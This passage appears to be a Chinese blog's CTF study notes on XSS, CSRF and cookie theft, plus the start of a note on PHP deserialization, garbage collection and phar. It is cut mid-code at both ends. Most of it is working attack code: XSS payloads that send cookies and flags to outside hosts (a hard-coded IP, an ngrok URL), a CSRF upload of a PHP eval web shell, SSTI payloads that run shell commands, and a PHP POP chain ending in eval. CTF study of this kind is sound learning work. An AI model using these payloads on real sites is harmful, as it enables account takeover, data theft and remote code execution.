id=\u0026#34;sandbox\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;script src=//vps-ip/xss/test.js\u0026gt;\u0026lt;/script\u0026gt;testxss\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Upload your shell\u0026lt;/p\u0026gt; \u0026lt;form action=\u0026#34;/upload\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;p\u0026gt;\u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34;\u0026gt;\u0026lt;/input\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;upload\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; 这个上传功能，就需要csrf，不过由于页面上的XHR被禁用，所以得额外调用出来\ntest.js\nwindow.XMLHttpRequest = document.getElementById(\u0026#39;sandbox\u0026#39;).contentWindow.XMLHttpRequest; var xhr = new XMLHttpRequest(); xhr.onreadystatechange=function(){ if(xhr.readyState==4){ //if(xhr.status==200){ res_status = \u0026#34;status: \u0026#34; + xhr.status + \u0026#34;\\n\u0026#34;; data = xhr.responseText; imgsrc=document.createElement(\u0026#34;img\u0026#34;); imgsrc.src = \u0026#34;http://121.42.175.111:8080/xss/xss_new.php?cookie=\u0026#34; + escape(res_status) + escape(data); //} } }; var formData = new FormData(); var content = \u0026#39;\u0026lt;?php @eval($_POST[c][/c]);?\u0026gt;\u0026#39;; var blob = new Blob([content], { type: \u0026#34;text/plain\u0026#34;}); formData.append(\u0026#34;file\u0026#34;, blob,\u0026#39;angelwhutestshell.php\u0026#39;); xhr.open(\u0026#34;POST\u0026#34;, \u0026#34;/upload\u0026#34;); xhr.send(formData); 配合主站的xss payload\n\u0026lt;script\u0026gt;xss = \u0026#34;\u0026lt;iframe id=\\\u0026#34;sandbox\\\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;script src=//******/xss/test.js\u0026gt;\u0026lt;\\/script\u0026gt;\u0026#34;;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;document.cookie=\u0026#34;username=\u0026#34;+xss+\u0026#34;testxss;domain=.government.vip;path=\\/;\u0026#34;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;location.href=\u0026#39;http://admin.government.vip:8000/\u0026#39;;\u0026lt;/script\u0026gt; 就可以获得flag了\n参考：wp | wp2 | wp3 | 知乎某处XSS+刷粉超详细漏洞技术分析\n[湖湘杯 2018]XmeO 预期 - SSTI {\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls -r /*/*\u0026#34;).read()\u0026#39;)}} 发现web目录为/home/XmeO，然后grep搜索flag字符\n{{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;grep hxb2018{ /home/XmeO/*\u0026#34;).read()\u0026#39;)}} 非预期 - xss 通过查看进程发现运行着\n在/static/assets/js/me.js中和上面0CTF那个题有一样的沙盒情况，响应头\nscript-src \u0026#39;self\u0026#39; 说明不允许内联脚本执行，也就是直接嵌套在\u0026lt;script\u0026gt;\u0026lt;/script\u0026gt;中的代码无法被执行，而\u0026lt;script src='url'\u0026gt;\u0026lt;/script\u0026gt;中的代码将被执行，而且必须同源（很经典的绕过方式，也可换成iframe\n后台请求的url为http://127.0.0.1:7443/admin/，提交xss payload\n\u0026lt;/div\u0026gt; \u0026lt;script src=http://127.0.0.1:7443/show/591b111c-096d-11eb-97c4-0242ac110003\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;div\u0026gt; 获取到hint\n/?hint=Try%20to%20get%20admin\u0026#39;s%20page%20content 由于页面的沙盒设置，我们利用上面的同款方式进行绕过\nvar ifm = document.createElement(\u0026#39;iframe\u0026#39;); ifm.setAttribute(\u0026#39;src\u0026#39;,\u0026#39;/admin/\u0026#39;); document.body.appendChild(ifm); window.XMLHttpRequest = window.top.frames[0].XMLHttpRequest; var xhr = new XMLHttpRequest();xhr.open(\u0026#34;GET\u0026#34;, \u0026#34;http://127.0.0.1:7443/admin/\u0026#34;,false); xhr.send(); c=xhr.responseText; window.location.href=\u0026#34;http://192.168.0.134:8889/?c=\u0026#34;+c; 会得到一个新的hint\n/?c=%20%20%20%20This%20website%20also%20have%20another%20page%20named%20mysecrecy_directory...... 问题转变为获取/admin/mysecrecy_directory下的cookie内容\nvar f= document.createElement(\u0026#39;iframe\u0026#39;); f.setAttribute(\u0026#39;src\u0026#39;,\u0026#39;/admin/mysecrecy_directory\u0026#39;); document.body.appendChild(f); f.onload = function(){ var a= f.contentWindow.document.cookie; location.href = \u0026#34;http://192.168.0.134:8889/?\u0026#34;+a; payload只需要把之前的src改一下，在iframe加载的同时获取iframe中的cookie，并利用href跳转获取flag\n参考：wp\n[uiuCTF 2021]YANA 写过太多次了，不详细展开了；关于缓存投毒 + 子域名接管 + XS-Leaks ≈ 寄\n[pbCTF 2021]TBDXSS 救啊 又是xss 给出了详细的源码，app.py+bot.js\nhttps://blog.maple3142.net/2021/10/11/pbctf-2021-writeups/#tbdxss\nhttps://blog.bawolff.net/2021/10/write-up-pbctf-2021-tbdxss.html\nhttps://github.com/sambrow/ctf-writeups-2021/tree/master/perfect-blue-ctf/TBDXSS\nfrom flask import Flask, request, session, jsonify, Response import json import redis import random import os import time app = Flask(__name__) app.secret_key = os.environ.get(\u0026#34;SECRET_KEY\u0026#34;, \u0026#34;tops3cr3t\u0026#34;) # session secret key app.config.update( SESSION_COOKIE_SECURE=True, SESSION_COOKIE_HTTPONLY=True, SESSION_COOKIE_SAMESITE=\u0026#39;Lax\u0026#39;, # samesite cookie lax ) HOST = os.environ.get(\u0026#34;CHALL_HOST\u0026#34;, \u0026#34;localhost:5000\u0026#34;) r = redis.Redis(host=\u0026#39;redis\u0026#39;) # 后端redis数据库 @app.after_request def add_XFrame(response): response.headers[\u0026#39;X-Frame-Options\u0026#39;] = \u0026#34;DENY\u0026#34; # 该页面不允许被任何页面引用，也不允许引用任何页面 return response @app.route(\u0026#39;/change_note\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) # 修改session中的note def add(): session[\u0026#39;note\u0026#39;] = request.form[\u0026#39;data\u0026#39;] session.modified = True return \u0026#34;Changed succesfully\u0026#34; @app.route(\u0026#34;/do_report\u0026#34;, methods=[\u0026#39;POST\u0026#39;]) def do_report(): cur_time = time.time() ip = request.headers.get(\u0026#39;X-Forwarded-For\u0026#39;).split(\u0026#34;,\u0026#34;)[-2].strip() # amazing google load balancer last_time = r.get(\u0026#39;time.\u0026#39;+ip) # 判断上报时间间隔 last_time = float(last_time) if last_time is not None else 0 time_diff = cur_time - last_time if time_diff \u0026gt; 6: r.rpush(\u0026#39;submissions\u0026#39;, request.form[\u0026#39;url\u0026#39;]) # 将上报url存入redis数据库中 r.setex(\u0026#39;time.\u0026#39;+ip, 60, cur_time) return \u0026#34;submitted\u0026#34; return \u0026#34;rate limited\u0026#34; @app.route(\u0026#39;/note\u0026#39;) # note全部存session中 在本地 def notes(): print(session) return \u0026#34;\u0026#34;\u0026#34; \u0026lt;body\u0026gt; {} \u0026lt;/body\u0026gt; \u0026#34;\u0026#34;\u0026#34;.format(session[\u0026#39;note\u0026#39;]) @app.route(\u0026#34;/report\u0026#34;, methods=[\u0026#39;GET\u0026#39;]) # 上报admin 转至/do_report def report(): return \u0026#34;\u0026#34;\u0026#34; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Notes app\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h3\u0026gt;\u0026lt;a href=\u0026#34;/note\u0026#34;\u0026gt;Get Note\u0026lt;/a\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;Change Note\u0026lt;/a\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026lt;a href=\u0026#34;/report\u0026#34;\u0026gt;Report Link\u0026lt;/a\u0026gt;\u0026lt;/h3\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;h3\u0026gt;Please report suspicious URLs to admin\u0026lt;/h3\u0026gt; \u0026lt;form action=\u0026#34;/do_report\u0026#34; id=\u0026#34;reportform\u0026#34; method=POST\u0026gt; URL: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;url\u0026#34; placeholder=\u0026#34;URL\u0026#34;\u0026gt; \u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;br\u0026gt; \u0026lt;/body\u0026gt; \u0026#34;\u0026#34;\u0026#34; @app.route(\u0026#39;/\u0026#39;) # 首页 def index(): return \u0026#34;\u0026#34;\u0026#34; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Notes app\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h3\u0026gt;\u0026lt;a href=\u0026#34;/note\u0026#34;\u0026gt;Get Note\u0026lt;/a\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;Change Note\u0026lt;/a\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026lt;a href=\u0026#34;/report\u0026#34;\u0026gt;Report Link\u0026lt;/a\u0026gt;\u0026lt;/h3\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;h3\u0026gt; Add a note \u0026lt;/h3\u0026gt; \u0026lt;form action=\u0026#34;/change_note\u0026#34; id=\u0026#34;noteform\u0026#34; method=POST\u0026gt; \u0026lt;textarea rows=\u0026#34;10\u0026#34; cols=\u0026#34;100\u0026#34; name=\u0026#34;data\u0026#34; form=\u0026#34;noteform\u0026#34; placeholder=\u0026#34;Note\u0026#39;s content\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;br\u0026gt; \u0026lt;/body\u0026gt; \u0026#34;\u0026#34;\u0026#34; 下面是bot.js\nconst redis = require(\u0026#39;redis\u0026#39;); const r = redis.createClient({ port : 6379, // replace with your port host : \u0026#39;redis\u0026#39;, // replace with your hostanme or IP address }) const puppeteer = require(\u0026#39;puppeteer\u0026#39;); async function browse(url){ console.log(`Browsing -\u0026gt; ${url}`); const browser = await (await puppeteer.launch({ headless: true, args: [\u0026#39;--no-sandbox\u0026#39;, \u0026#39;--disable-gpu\u0026#39;] })).createIncognitoBrowserContext(); // 无头模式 const page = await browser.newPage(); await page.setCookie({ name: \u0026#39;session\u0026#39;, value: process.env.CHALL_COOKIE, domain: process.env.CHALL_HOST, sameSite: \u0026#34;Lax\u0026#34;, // samesite cookie lax 警惕 secure: true, }); try { const resp = await page.goto(url, { // 访问url waitUntil: \u0026#39;load\u0026#39;, timeout: 20 * 1000, }); } catch (err){ console.log(err); } await page.close(); await browser.close(); console.log(`Done visiting -\u0026gt; ${url}`) } function main() { r.blpop([\u0026#39;submissions\u0026#39;, 0], async (_, submit_url) =\u0026gt; { let url = submit_url[1]; // 取出redis中提交的url await browse(url); // 处理url main(); }); } console.log(\u0026#34;XSS Bot ready\u0026#34;); main() flag在admin bot的cookie中，它会带着这个session访问我们的页面，如果它直接访问/note那么它本地的页面上就会有flag，但是我们无法获得\n注意到特殊的请求头X-Frame-Options=DENY，它使得该页面不允许被任何页面引用，也不允许引用任何页面，所以没法用iframe相关的技巧来做：发送给admin的页面(on our host)上共有两个iframe，第一个src指向/flag(可以看到flag的页面)的iframe，第二个iframe有我们的xss payload，这个payload中的script脚本可以做到XFS - cross frame scripting(读取top.frames)来到达原有的页面，转向页面的第一个iframe读到flag并取出，利用的是两个iframe是同源的，所以可以see each other\u0026rsquo;s content\n所以我们想到用window而不是iframe来达到相似的效果（原理一致）：发送给admin的页面(on our host)上有script可以在新窗口打开/note页面(含有flag)，然后script用csrf的方式post xss payload(设置target=\u0026quot;_blank\u0026quot;使其在新窗口出现)，在post完成之后将当前窗口转为之前的/note 来使post的xss执行，由于同源可以获得含flag的/note页面的内容，再fetch外带flag\n思路跟iframe的是一样的，只不过由切换iframe变为切换Tab window，接下来尝试写payload\n注意以下xss bot，由于它的watiUntil的设置，一旦被认为是加载就会直接die掉，这里的绕过方式是用中转页面手动延时让其挂起（setTimeout则起不到同样的效果\npayload-url\nhttp://xxxx/pb app.js\nlet express = require(\u0026#39;express\u0026#39;); let app = express(); app.get(\u0026#39;/pb\u0026#39;, function(req, res) { res.sendFile(__dirname + \u0026#39;/pb.html\u0026#39;); }); app.get(\u0026#39;/delayThen404\u0026#39;, function(req, res) { setTimeout(()=\u0026gt; { res.sendStatus(404); }, 5000) }); let port = 5050; let server = app.listen(port); console.log(\u0026#39;Local server running on port: \u0026#39; + port); /pb.html\n\u0026lt;body\u0026gt; \u0026lt;p\u0026gt;hello world\u0026lt;/p\u0026gt; \u0026lt;form action=\u0026#34;https://tbdxss.chal.perfect.blue/change_note\u0026#34; id=\u0026#34;noteform\u0026#34; method=POST target=\u0026#34;_blank\u0026#34;\u0026gt; \u0026lt;textarea id=\u0026#34;payload\u0026#34; rows=\u0026#34;10\u0026#34; cols=\u0026#34;100\u0026#34; name=\u0026#34;data\u0026#34; form=\u0026#34;noteform\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; // open new window that has the flag and give it a \u0026#34;name\u0026#34; of \u0026#34;flagWindow\u0026#34; window.open(\u0026#39;https://tbdxss.chal.perfect.blue/note\u0026#39;, \u0026#39;flagWindow\u0026#39;); // this POSTs the above form with an XSS note value to read and exfiltrate the flag // note: we must use \\x3C as an alternate form of the \u0026#34;less than\u0026#34; character to avoid browser parser confusion inside payload.value = \u0026#34;\\x3Cscript\u0026gt;let flagWindow = window.open(\u0026#39;\u0026#39;, \u0026#39;flagWindow\u0026#39;); let flag = flagWindow.document.documentElement.innerText; fetch(\u0026#39;http://8709-68-51-145-201.ngrok.io/?flag=\u0026#39; + flag);\\x3C/script\u0026gt;\u0026#34;; noteform.submit(); // Run this code after a 5 second delay to ensure the above POST has completed before we reload our XSS payload into *this* page. setTimeout(()=\u0026gt; { // This loads our previously-posted XSS which will read the flag from the previously-opened window and exfiltrate it. window.location.href = \u0026#39;https://tbdxss.chal.perfect.blue/note\u0026#39;; }, 5000) \u0026lt;/script\u0026gt; \u0026lt;!-- 提供延时来让上面的script执行 --\u0026gt; \u0026lt;img src=\u0026#39;https://xxxx/delayThen404\u0026#39; onerror=\u0026#34;window.location.href=\u0026#39;https://tbdxss.chal.perfect.blue/note\u0026#39;\u0026#34;\u0026gt; \u0026lt;/body\u0026gt; ————在另一个wp中学到delay还可以有专门的定型工具https://deelay.me/，用法是\nhttps://deelay.me/\u0026lt;delay in milliseconds\u0026gt;/\u0026lt;original url\u0026gt; eg: https://deelay.me/5000/https://picsum.photos/200/300 所以上面的我们还可以这样做：\nindex.php：做延时，转到main.php \u0026lt;script\u0026gt; open(location.href + \u0026#39;main.php\u0026#39;, \u0026#39;_blank\u0026#39;) \u0026lt;/script\u0026gt; \u0026lt;img src=\u0026#34;https://deelay.me/20000/https://example.com\u0026#34;\u0026gt; main.php：新开两个tab后当前页面重定向到含flag的/note中 \u0026lt;script\u0026gt; open(location.href.replace(\u0026#39;main\u0026#39;, \u0026#39;submit\u0026#39;), \u0026#39;_blank\u0026#39;) open(location.href.replace(\u0026#39;main\u0026#39;, \u0026#39;opennote\u0026#39;), \u0026#39;_blank\u0026#39;) location.href = \u0026#39;https://tbdxss.chal.perfect.blue/note\u0026#39; \u0026lt;/script\u0026gt; submit.php：标准csrf \u0026lt;form action=\u0026#34;https://tbdxss.chal.perfect.blue/change_note\u0026#34; method=\u0026#34;POST\u0026#34; id=f\u0026gt; \u0026lt;input name=\u0026#34;data\u0026#34; value=\u0026#34;peko\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; f.data.value = \u0026#39;\u0026lt;script\u0026gt;const report = t =\u0026gt; fetch(\u0026#34;https://YOUR_SERVER/xss.php\u0026#34;, {method: \u0026#34;POST\u0026#34;, body: t}); report(window.opener.opener.document.body.textContent)\u0026lt;/\u0026#39;+\u0026#39;script\u0026gt;\u0026#39; f.submit() \u0026lt;/script\u0026gt; opennote.php：delay后在新tab的/note中执行xss payload，由于是新tab，所以需要window.opener.opener才可以到原先的main.php \u0026lt;script\u0026gt;setTimeout(() =\u0026gt; { open(\u0026#39;https://tbdxss.chal.perfect.blue/note\u0026#39;, \u0026#39;_blank\u0026#39;) }, 1000)\u0026lt;/script\u0026gt; 参考：wp1 | wp2 | wp3\n[MiscCTF 2021]XSS to CSRF https://hg8.sh/posts/misc-ctf/xss-to-csrf/\n聊天机器人，发送的语句可以包含Html 会被渲染，尝试\n\u0026lt;img src=x onerror=alert(1)\u0026gt; 有反射型xsss\n进一步了解这个Bot的工作，遇到\u0026quot;badwords\u0026quot;会暂停对话，说明在后端经过了某些检测\n使用websocket进行内容的交互\n尝试直接建立与服务端的连接\nwebsocket = new WebSocket(\u0026#39;ws://misc.ctf:33433/\u0026#39;); websocket.onmessage = function(message) { console.log(message.data); } websocket.send(\u0026#39;test\u0026#39;) 继续尝试\n\u0026gt; websocket.send(\u0026#39;/help\u0026#39;) { \u0026#34;content\u0026#34;: \u0026#34;\u0026lt;message\u0026gt;\u0026#34; } to send a message /moderator to enter moderator mode debugger \u0026gt; websocket.send(\u0026#39;/moderator\u0026#39;) You need to be authenticated to execute this command 我们没有直接访问/moderator的权利，借助检测\u0026quot;badwords\u0026quot;的功能，发送含有建立websocket连接的payload，用CSRF的方式让bot访问 把结果外带\n\u0026lt;img src=x onerror=\u0026#34;ws=new WebSocket(\u0026#39;ws://\u0026#39;+window.location.host);ws.onopen=()=\u0026gt;ws.send(\u0026#39;/moderator\u0026#39;)\u0026#34;\u0026gt; 加上一个\u0026quot;badwords\u0026quot;\n🖕 \u0026lt;img src=x onerror=\u0026#34;ws=new WebSocket(\u0026#39;ws://\u0026#39;+window.location.host);ws.onopen=()=\u0026gt;ws.send(\u0026#39;/moderator\u0026#39;)\u0026#34;\u0026gt; *[247CTF 2021]Helicopter Administrator https://gusralph.info/exploiting-xss-for-sqli/\n[picoCTF 2022]noted HINT:\n\u0026ldquo;Are you sure I followed all the best practices?\u0026rdquo; \u0026ldquo;There\u0026rsquo;s more than just HTTP(S)!\u0026rdquo; \u0026ldquo;Things that require user interaction normally in Chrome might not require it in Headless Chrome.\u0026rdquo; The description also stated that the headless chrome has no internet access. So it cannot be used to phone home outside the context of this application. 登入账号后才能发内容，xss bot会先注册随机账号 登入后发flag 然后浏览我们的url，题目提示xss bot不能出网\n// report.js const crypto = require(\u0026#39;crypto\u0026#39;); const puppeteer = require(\u0026#39;puppeteer\u0026#39;); async function run(url) {\t// 对url无waf let browser; try { module.exports.open = true; browser = await puppeteer.launch({ headless: true, pipe: true, args: [\u0026#39;--incognito\u0026#39;, \u0026#39;--no-sandbox\u0026#39;, \u0026#39;--disable-setuid-sandbox\u0026#39;], slowMo: 10 }); let page = (await browser.pages())[0] await page.goto(\u0026#39;http://0.0.0.0:8080/register\u0026#39;);\t// 注册随机账号 await page.type(\u0026#39;[name=\u0026#34;username\u0026#34;]\u0026#39;, crypto.randomBytes(8).toString(\u0026#39;hex\u0026#39;)); await page.type(\u0026#39;[name=\u0026#34;password\u0026#34;]\u0026#39;, crypto.randomBytes(8).toString(\u0026#39;hex\u0026#39;)); await Promise.all([ page.click(\u0026#39;[type=\u0026#34;submit\u0026#34;]\u0026#39;), page.waitForNavigation({ waituntil: \u0026#39;domcontentloaded\u0026#39; }) ]); await page.goto(\u0026#39;http://0.0.0.0:8080/new\u0026#39;); await page.type(\u0026#39;[name=\u0026#34;title\u0026#34;]\u0026#39;, \u0026#39;flag\u0026#39;); await page.type(\u0026#39;[name=\u0026#34;content\u0026#34;]\u0026#39;, process.env.FLAG ?? \u0026#39;ctf{flag}\u0026#39;); await Promise.all([ page.click(\u0026#39;[type=\u0026#34;submit\u0026#34;]\u0026#39;), page.waitForNavigation({ waituntil: \u0026#39;domcontentloaded\u0026#39; }) ]); await page.goto(\u0026#39;about:blank\u0026#39;) await page.goto(url); await page.waitForTimeout(7500); await browser.close(); } catch(e) { console.error(e); try { await browser.close() } catch(e) {} } module.exports.open = false; } module.exports = { open: false, run } // web.js fastify.post(\u0026#39;/report\u0026#39;, { schema: reportSchema, preHandler: fastify.csrfProtection }, auth((req, res) =\u0026gt; { let { url } = req.body; if (report.open) { return res.send(\u0026#39;Only one browser can be open at a time!\u0026#39;); } else { report.run(url); } return res.send(\u0026#39;URL has been reported.\u0026#39;); })); 在notes.ejs中用\u0026lt;%- something %\u0026gt;的模板形式输出内容\n\u0026lt;h2\u0026gt;\u0026lt;%- note.title %\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;\u0026lt;%- note.content %\u0026gt;\u0026lt;/p\u0026gt; 可以做到self-xss，我们联想到csrf+xss的常见打法：xss一个csrf的内容，比如这里的登录账号的表单；但是flag是在随机账号中，要xss必须也覆盖cookie\n联想TBDXSS那个题目 两个tab之间实现内容的读取：如果window A B都有相同的document.domain，只要有window reference就可以读取另一个window的DOM内容；所以只要让A是POST login之前的页面，B是self-xss的页面，读取A的DOM就可以拿到flag\n另外注意一下report.js中并没有对我们的url加waf，所以javascript:alert(1)之类的url也能在about:blank上xss 或者开新的window构成csrf，比如像javascript:eval(atob(xxxx))这样操作js内容\n关于flag的回显，由于bot不出网，我们考虑创建一个账号，将flag用self-xss+iframe的方式传回来\n提交url，用javascript:形式的url 包含一个csrf的表单，强制登入我们的账号\nconst csrf = ` \u0026lt;form name=frm action=\u0026#39;http://0.0.0.0:8080/login\u0026#39; method=post\u0026gt; \u0026lt;input name=username value=supernene\u0026gt; \u0026lt;input name=password value=supernene\u0026gt; \u0026lt;/form\u0026gt; `\t// 登入我们的已知账户 const js = ` win = window.open(\u0026#39;\u0026#39;, \u0026#39;\u0026#39;) win.document.body.innerHTML = atob(\u0026#39;${btoa(csrf)}\u0026#39;) win.document.frm.submit() location.href = \u0026#39;http://0.0.0.0:8080\u0026#39; `\t// 在about:blank页面操作 const url = `javascript:eval(atob(\u0026#39;${btoa(js)}\u0026#39;))` console.log(url) 登入的我们的账号中含有如下的self-xss payload，读取之前bot页面中的flag，\n\u0026lt;iframe src=\u0026#34;/new\u0026#34; id=frm\u0026gt; \u0026lt;/iframe\u0026gt; \u0026lt;script\u0026gt; const flag = window.opener.document.body.textContent frm.onload=()=\u0026gt;{ frm.onload=null const newfrm = frm.contentDocument.forms[0]\t// 确保new tab newfrm.title.value = \u0026#39;FLAG\u0026#39; newfrm.content.value = flag newfrm.submit() } \u0026lt;/script\u0026gt; 参考：wp1 | wp2\n","date":"2022-04-24T21:58:17+08:00","permalink":"https://amiaaaz.github.io/2022/04/24/xss-csrf-study-notes/","section":"posts","tags":["XSS","CSRF","Cookie"],"title":"cookie相关的xss\u0026csrf"},{"categories":["NOTES\u0026SUMMARY"],"contents":"报错\u0026amp;GC相关问题 PHP是存在GC的语言，而反序列化对象时的__destruct就是对已new对象的回收，一个小栗子\n\u0026lt;?php error_reporting(0); class test{ public $num; public function __construct($num){ $this-\u0026gt;num = $num; echo $this-\u0026gt;num.\u0026#34;__construct\u0026#34;.\u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; } public function __destruct(){ echo $this-\u0026gt;num.\u0026#34;__destruct\u0026#34;.\u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; } } new test(1); $a = new test(2); $b = new test(3); // 1__construct\u0026lt;/br\u0026gt;1__destruct\u0026lt;/br\u0026gt;2__construct\u0026lt;/br\u0026gt;3__construct\u0026lt;/br\u0026gt;3__destruct\u0026lt;/br\u0026gt;2__destruct\u0026lt;/br\u0026gt; 当下面的三行代码均和第一行一样，无引用和指向，那么都将会是依次的construct+destruct，但是在上述例子中，只有对象1没有引用和指向 所以只有它创建后立刻回收；再看下面这两种情况\n$c = array(new test(1), 0); $c[0] = $c[1]; $a = new test(2); $b = new test(3); // 1__construct\u0026lt;/br\u0026gt;1__destruct\u0026lt;/br\u0026gt;2__construct\u0026lt;/br\u0026gt;3__construct\u0026lt;/br\u0026gt;3__destruct\u0026lt;/br\u0026gt;2__destruct\u0026lt;/br\u0026gt; $c = array(new test(1), 0); // $c[0] = $c[1]; $a = new test(2); $b = new test(3); // 1__construct\u0026lt;/br\u0026gt;2__construct\u0026lt;/br\u0026gt;3__construct\u0026lt;/br\u0026gt;3__destruct\u0026lt;/br\u0026gt;2__destruct\u0026lt;/br\u0026gt;1__destruct\u0026lt;/br\u0026gt; ————很好理解：无变量指向的new的对象创建后即回收，有指向的按创建时间倒序回收（先创建的最后回收\n问题的关键在于可能来搅局的throw new Exception();，比如\nunserialize($_GET[\u0026#39;url\u0026#39;]); throw new Exception(\u0026#34;xxx\u0026#34;); 在这种情况下程序异常报错退出，我们pop链中重要的__destruct不会执行（它在对象正常销毁时被执行），比如一个很简单的pop链\n\u0026lt;?php highlight_file(__FILE__); error_reporting(0); class errorr0{ public $num; public function __destruct(){ echo \u0026#34;hello __destruct\u0026#34;; echo $this-\u0026gt;num; } } class errorr1{ public $err; public function __toString() { echo \u0026#34;hello __toString\u0026#34;; $this-\u0026gt;err-\u0026gt;flag(); } } class errorr2{ public $err; public function flag() { echo \u0026#34;hello __flag()\u0026#34;; eval($this-\u0026gt;err); } } $e1 = new errorr0(); $e2 = new errorr1(); $e3 = new errorr2(); $e3-\u0026gt;err = \u0026#34;phpinfo();\u0026#34;; $e2-\u0026gt;err = $e3; $e1-\u0026gt;num = $e2; $result = serialize($e1); unserialize($result); // O:7:\u0026#34;errorr0\u0026#34;:1:{s:3:\u0026#34;num\u0026#34;;O:7:\u0026#34;errorr1\u0026#34;:1:{s:3:\u0026#34;err\u0026#34;;O:7:\u0026#34;errorr2\u0026#34;:1:{s:3:\u0026#34;err\u0026#34;;s:10:\u0026#34;phpinfo();\u0026#34;;}}} 如果我们向最后一行的unserialize之后再添加throw new Exception，我们会发现原来的phpinfo界面立刻就会消失，阻止__destruct的执行\n针对这种情况，我们选择将对象插在有NULL元素的数组中\n$e1 = new errorr0(); $e2 = new errorr1(); $e3 = new errorr2(); $e3-\u0026gt;err = \u0026#34;phpinfo();\u0026#34;; $e2-\u0026gt;err = $e3; $e1-\u0026gt;num = $e2; $c = array(0=\u0026gt;$e1, 1=\u0026gt;NULL); // a:2:{i:0;O:7:\u0026#34;errorr0\u0026#34;:1:{s:3:\u0026#34;num\u0026#34;;O:7:\u0026#34;errorr1\u0026#34;:1:{s:3:\u0026#34;err\u0026#34;;O:7:\u0026#34;errorr2\u0026#34;:1:{s:3:\u0026#34;err\u0026#34;;s:10:\u0026#34;phpinfo();\u0026#34;;}}}i:1;N;} // a:2:{i:0;O:7:\u0026#34;errorr0\u0026#34;:1:{s:3:\u0026#34;num\u0026#34;;O:7:\u0026#34;errorr1\u0026#34;:1:{s:3:\u0026#34;err\u0026#34;;O:7:\u0026#34;errorr2\u0026#34;:1:{s:3:\u0026#34;err\u0026#34;;s:10:\u0026#34;phpinfo();\u0026#34;;}}}i:0;N;} 而直接serialize($c)的结果也无法达到预期，数组中i=0是我们的对象，i=1是NULL，我们手动把i:1改为i:0，也就是改为NULL 让其失去引用，提前GC触发__destruct\nphar中的应用 而这种改动在phar中会造成签名错误（phpstorm会无法再识别），需要重新生成签名（不过依旧无法识别）\nfrom hashlib import sha1 file = open(\u0026#34;arsenetang.phar\u0026#34;,\u0026#34;rb\u0026#34;).read() text = file[:-28] # 读取开始到末尾除签名外内容 last = file[-8:] # 读取最后8位的GBMB和签名flag new_file = text+sha1(text).digest() + last # 生成新的文件内容 此时sha1正确 open(\u0026#34;change.phar\u0026#34;,\u0026#34;wb\u0026#34;).write(new_file) [NSSCTF 2021]prize_p1 \u0026lt;?php highlight_file(__FILE__); class getflag { function __destruct() { // echo getenv(\u0026#34;FLAG\u0026#34;); // 目标 echo \u0026#34;flag{111}\u0026#34;; // 本地测试 } } class A { public $config; function __destruct() { if ($this-\u0026gt;config == \u0026#39;w\u0026#39;) { $data = $_POST[0]; // 传入phar内容 if (preg_match(\u0026#39;/get|flag|post|php|filter|base64|rot13|read|data/i\u0026#39;, $data)) { die(\u0026#34;我知道你想干吗，我的建议是不要那样做。\u0026#34;); } file_put_contents(\u0026#34;./tmp/a.txt\u0026#34;, $data); // 传入phar内容 } else if ($this-\u0026gt;config == \u0026#39;r\u0026#39;) { $data = $_POST[0]; // 文件路径 if (preg_match(\u0026#39;/get|flag|post|php|filter|base64|rot13|read|data/i\u0026#39;, $data)) { die(\u0026#34;我知道你想干吗，我的建议是不要那样做。\u0026#34;); } echo file_get_contents($data); // phar触发反序列化 } } } if (preg_match(\u0026#39;/get|flag|post|php|filter|base64|rot13|read|data/i\u0026#39;, $_GET[0])) { die(\u0026#34;我知道你想干吗，我的建议是不要那样做。\u0026#34;); } 